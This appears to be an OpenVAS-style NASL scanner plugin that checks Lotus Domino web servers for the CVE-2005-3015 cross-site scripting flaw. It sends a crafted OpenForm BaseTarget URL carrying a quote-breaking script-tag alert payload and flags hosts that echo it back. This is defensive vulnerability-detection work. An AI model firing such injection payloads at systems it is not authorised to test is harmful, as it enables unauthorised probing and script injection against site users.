CPE = "cpe:/a:ibm:lotus_domino";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.19764" );
	script_version( "2020-09-22T09:01:10+0000" );
	script_tag( name: "last_modification", value: "2020-09-22 09:01:10 +0000 (Tue, 22 Sep 2020)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_cve_id( "CVE-2005-3015" );
	script_bugtraq_id( 14845, 14846 );
	script_name( "Lotus Domino Src and BaseTarget XSS" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2005 David Maciejak" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_hcl_domino_consolidation.sc", "cross_site_scripting.sc" );
	script_mandatory_keys( "hcl/domino/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "solution", value: "Upgrade to Domino 6.5.2 or newer." );
	script_tag( name: "summary", value: "The remote host runs Lotus Domino web server
  which is vulnerable to multiple cross-site scripting due to a lack of
  sanitization of user-supplied data." );
	script_tag( name: "impact", value: "Successful exploitation of
  this issue may allow an attacker to execute malicious script code in a
  user's browser within the context of the affected application." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
host = http_host_name( dont_add_port: TRUE );
if(http_get_has_generic_xss( port: port, host: host )){
	exit( 0 );
}
r = http_get_cache( item: "/", port: port );
if(!r){
	exit( 0 );
}
matches = egrep( pattern: "src=.+(.+?OpenForm.+BaseTarget=)", string: r );
for match in split( matches ) {
	match = chomp( match );
	matchspec = eregmatch( pattern: "src=\"(.+?OpenForm.+BaseTarget=)", string: match );
	if(!isnull( matchspec )){
		url = NASLString( matchspec[1], "\";+<script>alert(foo)</script>;+var+mit=\"a" );
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(!res){
			continue;
		}
		if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert(foo)</script>" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
		}
	}
}
exit( 0 );

